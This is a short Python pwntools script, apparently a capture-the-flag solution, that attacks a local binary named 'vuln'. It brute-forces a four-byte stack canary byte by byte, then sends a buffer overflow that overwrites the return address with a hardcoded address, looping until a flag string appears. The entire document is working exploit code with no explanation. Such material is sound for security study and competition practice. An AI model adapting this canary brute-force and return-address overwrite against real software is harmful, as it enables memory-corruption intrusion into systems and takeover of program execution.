#!/bin/python3

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'


canaryOffset = 0x58 - 0x38 # from gdb
retOffset = 0x6c - 0x5c


def leakCanary():

	payload = b"A"*canaryOffset

	canary = b""

	payloadLen = canaryOffset


	for _ in range(4): # because there are 4 bytes
		payloadLen +=1
		for c in range(2**8):
			p = process('./vuln')
			p.recvuntil("> ")
			p.sendline(str.encode(str(payloadLen)))
			p.recvuntil("> ")
			p.send(payload + canary + str.encode(chr(c)))
			response = p.recv()
			p.close()
			if b"Smashing" not in response:
				canary += str.encode(chr(c))

				break
	return canary

def exploit(canary):
	e = ELF('./vuln')
	# r = ROP('./vuln')

	flagOut = b""
	while b'adamCTF' not in flagOut:
		p = process('./vuln')

		payload = b"A"*canaryOffset
		payload += canary
		payload += b"B"*retOffset
		# payload += p32((e.sym['display_flag'] % 0x1000) & 0xFFFF)
		payload += p32(0x56556269)
		p.recvuntil("> ")
		p.sendline(str.encode(str(len(payload))))

		p.recvuntil("> ")
		p.send(payload)

		p.recvuntil("Flag?\n")

		try:
			flagOut = p.recv()
		except:
			p.close()


	print(flagOut.rstrip().decode("UTF-8"))


canary = leakCanary()
# canary = b'LjgH'
print(f'Found the canary: {canary}')
exploit(canary)
